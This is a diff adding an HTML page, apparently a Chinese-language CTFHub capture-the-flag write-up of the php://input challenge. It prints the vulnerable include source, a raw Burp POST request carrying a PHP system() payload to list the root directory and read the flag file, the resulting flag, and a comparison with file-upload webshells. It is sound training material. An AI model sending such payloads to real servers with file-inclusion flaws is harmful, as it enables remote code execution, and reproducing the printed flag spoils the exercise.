@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-RCE php://input 伪协议 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #dfe2e5; padding: 8px 12px; text-align: left; }
+        th { background-color: #f6f8fa; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-RCE php://input 伪协议 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, RCE, 文件包含, php://input, BurpSuite社区版, 横向对比</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - RCE / php://input</li>
+        <li><strong>题目名称：</strong>php://input</li>
+        <li><strong>环境：</strong>VS Code + Burp Suite 社区版自带浏览器。</li>
+        <li><strong>目标：</strong>利用 PHP 的 <code>php://input</code> 伪协议，在无物理木马文件的情况下，直接通过 POST 请求体执行 PHP 代码，实现 RCE。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>利用 <code>php://input</code> 伪协议绕过文件包含限制并执行任意代码。</p >
+    
+    <div class="diff-box">
+        <strong>知识点（比喻说明）：</strong>
+        <ul>
+            <li><strong>php://input 伪协议：</strong>可以把请求的 POST Body 当成一个文件。当使用 <code>include("php://input")</code> 时，服务器会将 POST 请求体里的内容当成 PHP 代码去执行。</li>
+            <li><strong>与文件上传的区别：</strong>文件上传需要物理落地一个木马文件并访问它；而 <code>php://input</code> 相当于“后厨直达传送带”，无需落地物理文件，POST 数据随传随执行。</li>
+            <li><strong>过滤逻辑分析：</strong>源码限制了 <code>file</code> 参数必须以 <code>php://</code> 开头。这意味着传统的包含本地文件（如 <code>shell.txt</code>）的战术失效，必须使用伪协议破局。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计</h3>
+        <pre><code>&lt;?php
+if (isset($_GET['file'])) {
+    if ( substr($_GET["file"], 0, 6) === "php://" ) {
+        include($_GET["file"]);
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>substr($_GET["file"], 0, 6) === "php://"</code>：核心过滤逻辑，只允许包含以 php:// 开头的伪协议。</li>
+            <li><code>include($_GET["file"]);</code>：包含漏洞点。由于过滤了开头，只能利用 php://input。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">获得信息：</span>靶场无物理木马，提示“i don't have shell”，必须使用 php://input 打 POST。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：配置 Burp 并构造 POST 请求</h3>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>由于 php://input 专门读取 POST 请求体，必须使用 Burp 拦截并改为 POST 请求。</p >
+        <p class="info-line"><span class="info-label">实际使用工具：</span>Burp Suite 社区版自带浏览器 + Repeater 模块。</p >
+        <p class="info-line"><span class="info-label">Burp 修改要点：</span></p >
+        <ul>
+            <li>将第一行请求方法由 <code>GET</code> 改为 <code>POST</code>。</li>
+            <li>URL 改为 <code>POST /?file=php://input HTTP/1.1</code>。</li>
+            <li>Body 处必须空一行，然后写入 PHP 代码：<code>&lt;?php system('ls /'); ?&gt;</code>。</li>
+            <li>Content-Length 严格等于 Body 字节数。</li>
+        </ul>
+        <div class="payload-box">
+            <p><strong>实际请求体内容：</strong></p>
+            <pre><code>POST /?file=php://input HTTP/1.1
+Host: challenge-9f5c0af2d5de09e5.sandbox.ctfhub.com:10800
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+
+&lt;?php system('ls /'); ?&gt;</code></pre>
+        </div>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：执行命令寻找 Flag</h3>
+        <p class="info-line"><span class="info-label">回显结果：</span>Response 响应中列出根目录，发现目标文件 <code>flag_13611</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确定目标绝对路径为 <code>/flag_13611</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：读取 Flag 并提交</h3>
+        <p class="info-line"><span class="info-label">修改 Body 为：</span><code>&lt;?php system('cat /flag_13611'); ?&gt;</code>，点击 Send。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span><code>ctfhub{fadecaba3920dcb6e5932c5a}</code></p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><b>Burp 社区版长度计算陷阱：</b> 手动修改 Body 后，社区版 BP 有时无法准确自动更新 Content-Length，必须在请求头手动修改，否则会报 400 Bad Request。</li>
+        <li><b>GET 与 POST 混淆：</b> <code>php://input</code> 只能读 POST 原始字节流。如果不改为 POST，或者把代码拼在 URL 里，包含将失败且无回显。</li>
+        <li><b>空格与转义：</b> 在 Repeater 中写 Payload 不受 URL 地址栏转义影响，直接写最标准的 PHP 代码即可。</li>
+    </ul>
+
+    <h2>5. 知识总结与横向对比</h2>
+    
+    <div class="note">
+        <strong>核心心得：</strong><br>
+        刚做完这题，我立刻联想到之前练习过的<b>文件上传漏洞</b>。它们的本质惊人地相似——都在试图让服务器执行我们的恶意代码（一句话木马）。但在实现路径上，却有着截然不同的轨迹。以下是两者的详细横向对比，方便以后遇到同类题目时迅速找到破局点。
+    </div>
+
+    <table>
+        <thead>
+            <tr>
+                <th>对比维度</th>
+                <th>文件上传漏洞</th>
+                <th>php://input (文件包含)</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><b>核心载体</b></td>
+                <td>物理文件（如 shell.php, shell.jpg）</td>
+                <td>内存数据流（POST 请求体中的原始数据）</td>
+            </tr>
+            <tr>
+                <td><b>落地方式</b></td>
+                <td>必须将文件写入服务器硬盘（落地）</td>
+                <td>无需落地，代码随请求即时传输并执行</td>
+            </tr>
+            <tr>
+                <td><b>触发方式</b></td>
+                <td>需二次访问：先上传，再访问文件 URL 触发木马</td>
+                <td>一步到位：包含伪协议的同时，立即执行 Body 中的代码</td>
+            </tr>
+            <tr>
+                <td><b>过滤与绕过</b></td>
+                <td>需绕过前端 JS、MIME 类型、文件头、黑名单后缀等重重检测</td>
+                <td>只需满足包含点的路径前缀限制（如强制以 php:// 开头）</td>
+            </tr>
+            <tr>
+                <td><b>Payload 构造</b></td>
+                <td>构造 <code>multipart/form-data</code> 请求，将木马隐藏在文件内容中</td>
+                <td>将请求改为 <code>POST</code>，在 Body 中直接写入带 <code>&lt;?php ?&gt;</code> 的代码</td>
+            </tr>
+            <tr>
+                <td><b>利用条件</b></td>
+                <td>存在上传点，且上传目录具备执行权限</td>
+                <td>存在文件包含点，且服务端开启了 <code>allow_url_include</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="diff-box">
+        <strong>总结（攻击链思维）：</strong>
+        <ul>
+            <li><b>文件上传：</b>需要完成“上传 -> 绕过检测 -> 落地 -> 访问触发”的完整链条，任何一环被拦截都会失败，对服务器的配置要求更高。</li>
+            <li><b>php://input：</b>本质是“发送载荷 -> 服务端直接执行”，攻击路径极短，没有物理落地文件的环节，是文件包含漏洞中最干净、最迅速的利用方式。</li>
+            <li><b>两者的终极目标一致：</b>只要“木马”能在服务器上执行，接下来的操作（如 <code>ls /</code> 和 <code>cat /flag</code>）是完全通用的。</li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
